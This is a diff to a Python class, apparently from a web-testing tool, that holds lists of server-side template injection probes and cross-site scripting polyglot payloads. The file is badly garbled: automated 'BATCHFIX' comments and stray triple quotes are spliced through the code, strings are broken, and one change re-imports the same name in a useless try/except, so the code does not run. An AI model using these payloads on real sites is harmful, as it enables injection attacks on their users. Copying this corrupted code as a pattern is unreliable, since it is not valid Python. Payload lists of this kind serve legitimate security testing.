@@ -12,7 +12,10 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-from typing import List
+try:
+    from typing import List
+except ImportError:
+    from typing import List
 
 
 
@@ -28,23 +31,29 @@ class PayloadIntelligence:
 
     SSTI_PAYLOADS = [
         "{{7*7}}","        "${7*7}","        "<%= 7*7 %>","        "#{7*7}","        "*{7*7}","        "{{self}}","        "{{config.items()}}","# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """         "{{[].__class__.__base__.__subclasses__()}}","    ]
 
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     def get_payloads(category: str) -> List[str]:"Retrieve payloads for a specific category.        category = category.upper()
         if hasattr(PayloadIntelligence, f"{category}_PAYLOADS"):"            return getattr(PayloadIntelligence, f"{category}_PAYLOADS")"# [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """         return []""""
     @staticmethod
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented metadata/non-Python""""# [BATCHFIX] Commented metadata/non-Python
+""" [BATCHFIX] Commented metadata/non-Python""""
+# [BATCHFIX] Commented metadata/non-Python
 """     def get_xss_polyglots() -> List[str]:"Polyglot payloads that work in multiple contexts.        return [
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unmatched parenthesis""""#             (
+""" [BATCHFIX] Commented unmatched parenthesis""""
+#             (
                 'jaVasCript:/*-/*`/*\\"/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//'"'# [BATCHFIX] Commented metadata/non-Python
 """                 "</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()>\\x3e"  # [BATCHFIX] closed string"            ),
 # [BATCHFIX] Commented metadata/non-Python
-""" [BATCHFIX] Commented unterminated string""""#             "'\"><svg/onload=alert(1)>","  # [BATCHFIX] closed string"'            "javascript:alert(1)//","        ]
+""" [BATCHFIX] Commented unterminated string""""
+#             "'\"><svg/onload=alert(1)>","  # [BATCHFIX] closed string"'            "javascript:alert(1)//","        ]
